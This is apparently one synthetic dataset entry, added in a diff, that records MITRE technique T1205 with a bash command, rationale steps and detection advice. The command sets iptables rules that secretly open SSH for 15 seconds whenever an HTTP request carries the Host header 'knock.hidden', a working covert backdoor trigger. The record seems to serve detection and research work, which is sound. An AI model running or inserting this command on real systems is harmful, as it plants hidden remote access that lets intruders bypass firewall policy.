@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -lc 'ufw --force enable && ufw default deny incoming && ufw logging high && iptables -I ufw-before-input 1 -p tcp --dport 80 -m string --algo bm --string \"Host: knock.hidden\" -m recent --name HTTPK --set && iptables -I ufw-before-input 1 -p tcp --dport 22 -m recent --rcheck --seconds 15 --name HTTPK -j ACCEPT'",
+  "explanation": "Watches HTTP requests on TCP/80 and uses a specific Host header \"knock.hidden\" as a covert trigger to open SSH for 15s. This uses application-layer signaling via HTTP headers. Detection: Inspect HTTP headers for odd hostnames and correlate with a short-lived SSH acceptance from the requester.",
+  "rationale_steps": [
+    "Enable ufw, deny incoming by default, and enable logging.",
+    "Match HTTP Host header string on TCP/80 and set recent:HTTPK.",
+    "Allow TCP/22 to sources marked in recent:HTTPK within 15 seconds.",
+    "Detect via reverse proxy/firewall logs for unusual Host headers followed by SSH access."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-eb871457-a20060e0",
+  "source_prompt_hash": "eb871457",
+  "timestamp_utc": "2025-09-30T03:48:01.284804Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
